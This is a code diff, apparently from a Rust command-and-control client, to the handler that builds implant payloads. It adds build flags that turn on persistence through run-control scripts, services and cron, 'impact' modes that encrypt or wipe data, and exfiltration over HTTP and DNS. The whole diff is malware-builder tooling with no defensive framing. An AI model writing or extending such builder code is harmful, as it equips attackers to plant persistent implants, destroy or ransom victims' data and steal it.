@@ -141,7 +141,12 @@ async fn handle_command(cmd: Command, client: Arc<dyn C2Client>, tx: mpsc::Sende
             let res = client.kill_ghost(&ghost_id).await;
             let _ = tx.send(Action::ReceiveKillResult(res)).await;
         },
-        Command::BuildPayload { url, port, debug, persistence, impact, exfil } => {
+        Command::BuildPayload {
+            url, port, debug,
+            persistence, persist_runcontrol, persist_service, persist_cron,
+            impact, impact_encrypt, impact_wipe,
+            exfil, exfil_http, exfil_dns
+        } => {
             let res = tokio::task::spawn_blocking(move || {
                 use std::process::Command;
 
@@ -155,8 +160,15 @@ async fn handle_command(cmd: Command, client: Arc<dyn C2Client>, tx: mpsc::Sende
                     .arg(format!("-DSHADOW_PORT={}", port))
                     .arg(format!("-DENABLE_DEBUG={}", if debug { "ON" } else { "OFF" }))
                     .arg(format!("-DENABLE_PERSISTENCE={}", if persistence { "ON" } else { "OFF" }))
+                    .arg(format!("-DPERSIST_RUNCONTROL={}", if persist_runcontrol { "ON" } else { "OFF" }))
+                    .arg(format!("-DPERSIST_SERVICE={}", if persist_service { "ON" } else { "OFF" }))
+                    .arg(format!("-DPERSIST_CRON={}", if persist_cron { "ON" } else { "OFF" }))
                     .arg(format!("-DENABLE_IMPACT={}", if impact { "ON" } else { "OFF" }))
+                    .arg(format!("-DIMPACT_ENCRYPT={}", if impact_encrypt { "ON" } else { "OFF" }))
+                    .arg(format!("-DIMPACT_WIPE={}", if impact_wipe { "ON" } else { "OFF" }))
                     .arg(format!("-DENABLE_EXFIL={}", if exfil { "ON" } else { "OFF" }))
+                    .arg(format!("-DEXFIL_HTTP={}", if exfil_http { "ON" } else { "OFF" }))
+                    .arg(format!("-DEXFIL_DNS={}", if exfil_dns { "ON" } else { "OFF" }))
                     .output();
 
                 match status {
@@ -165,7 +177,7 @@ async fn handle_command(cmd: Command, client: Arc<dyn C2Client>, tx: mpsc::Sende
                     _ => {}
                 }
 
-                let build = Command::new("make")
+                let build = Command::new("cmake")
                     .arg("--build").arg(&build_dir)
                     .arg("--config").arg("Release")
                     .output();
